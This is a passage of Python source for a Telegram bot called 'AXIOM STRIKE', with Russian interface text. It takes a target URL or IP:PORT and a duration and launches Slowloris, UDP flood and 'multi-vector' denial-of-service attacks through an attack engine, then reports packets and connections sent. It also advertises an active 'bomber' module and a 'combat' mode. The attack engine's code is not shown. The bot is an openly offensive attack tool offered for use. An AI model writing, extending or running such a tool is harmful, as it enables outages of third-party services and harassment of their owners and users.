        await state.set_state(DDoSStates.waiting_for_url)
        await message.answer(
            "🐌 **SLOWLORIS**\n\n"
            "Введите URL цели:\n"
            "📝 Пример: https://example.com"
        )

    async def process_ddos_ddos_duration(self, message: types.Message, state: FSMContext):
        try:
            duration = int(message.text.strip())
            if duration < 60 or duration > 600:
                await message.answer("❌ Введите число от 60 до 600!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        url = data.get('url')
        method = data.get('method', 'slowloris')
        ip = data.get('ip')
        port = data.get('port')
        await state.clear()

        status_msg = await message.answer(
            f"💀 **{method.upper()} запущена!**\n"
            f"⏳ Идёт атака..."
        )

        if method == 'slowloris':
            stats = await self.ddos_engine.slowloris(url, duration, None)
            result_text = (
                f"🐌 **SLOWLORIS завершена!**\n\n"
                f"🌐 URL: {url}\n"
                f"📊 Соединений: {stats['connections']}\n"
                f"🔄 Активных: {stats['active']}\n"
                f"⏱ Длительность: {duration}с"
            )
        elif method == 'udp':
            stats = await self.ddos_engine.udp_flood(ip, port, duration, None)
            result_text = (
                f"📡 **UDP FLOOD завершена!**\n\n"
                f"🌐 IP: {ip}:{port}\n"
                f"📦 Пакетов: {stats['packets']}\n"
                f"💾 Байт: {stats['bytes']}\n"
                f"⏱ Длительность: {duration}с"
            )
        elif method == 'multi':
            stats = await self.ddos_engine.multi_vector(url, duration, None)
            result_text = (
                f"💀 **MULTI-VECTOR завершена!**\n\n"
                f"🌐 URL: {url}\n"
                f"📊 HTTP запросов: {stats['http']['requests']}\n"
                f"🌐 HTTP успешно: {stats['http']['success']}\n"
                f"🐌 Slowloris соединений: {stats['slowloris']['connections']}\n"
                f"📦 UDP пакетов: {stats['udp']['packets']}\n"
                f"💾 UDP байт: {stats['udp']['bytes']}\n"
                f"⏱ Длительность: {duration}с"
            )
        else:
            result_text = "❌ Неизвестный метод"

        await status_msg.edit_text(result_text, reply_markup=self.ddos_keyboard())

    async def handle_udp_flood(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_ip)
        await message.answer(
            "📡 **UDP FLOOD**\n\n"
            "Введите IP:PORT цели:\n"
            "📝 Пример: 192.168.1.1:80"
        )

    async def process_ddos_ip(self, message: types.Message, state: FSMContext):
        try:
            ip, port = message.text.strip().split(':')
            port = int(port)
        except:
            await message.answer("❌ Введите в формате IP:PORT!")
            return

        await state.update_data(ip=ip, port=port, method='udp')
        await state.set_state(DDoSStates.waiting_for_ddos_duration)
        await message.answer("⏱ Введите длительность (30-120 сек):")

    async def handle_multi_vector(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_url)
        await state.update_data(method='multi')
        await message.answer(
            "💀 **MULTI-VECTOR**\n\n"
            "Введите URL цели:\n"
            "📝 Пример: https://example.com"
        )

    # ========== СТАТИСТИКА И НАСТРОЙКИ ==========
    async def handle_stats(self, message: types.Message):
        await message.answer(
            "📊 **СТАТИСТИКА AXIOM STRIKE**\n\n"
            f"📅 Дата: {datetime.now().strftime('%d.%m.%Y %H:%M')}\n"
            f"📱 Бомбер: активен\n"
            f"💣 DDoS: активен\n"
            f"⚡ Статус: ONLINE\n"
            f"🔥 Версия: 3.0.0",
            reply_markup=self.main_keyboard()
        )

    async def handle_settings(self, message: types.Message):
        await message.answer(
            "⚙️ **НАСТРОЙКИ**\n\n"
            "🔹 Язык: Русский\n"
            "🔹 Режим: Боевой\n"
            "🔹 Уведомления: Включены\n"
            "🔹 Логирование: Включено\n\n"
            "📌 Для изменения настроек обратитесь к администратору.",
            reply_markup=self.main_keyboard()
        )

    # ========== ЗАПУСК ==========
    async def start(self):
        logger.info("🔥 Запуск AXIOM STRIKE BOT...")
        try:
            await self.bot.get_me()
            logger.info("✅ Подключение успешно!")
            await self.dp.start_polling(self.bot)
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            raise


# ===================== ЗАПУСК =====================
if __name__ == "__main__":
    import re

    if API_TOKEN == "ВСТАВИТЬ_ТОКЕН_СЮДА":
        print("❌ Ошибка: Не установлен токен бота!")
        exit(1)

    try:
        bot = AxiomStrikeBot(token=API_TOKEN)
        asyncio.run(bot.start())
    except KeyboardInterrupt:
        print("\n⏹️ Бот остановлен")
    except Exception as e:
        print(f"❌ Ошибка: {e}")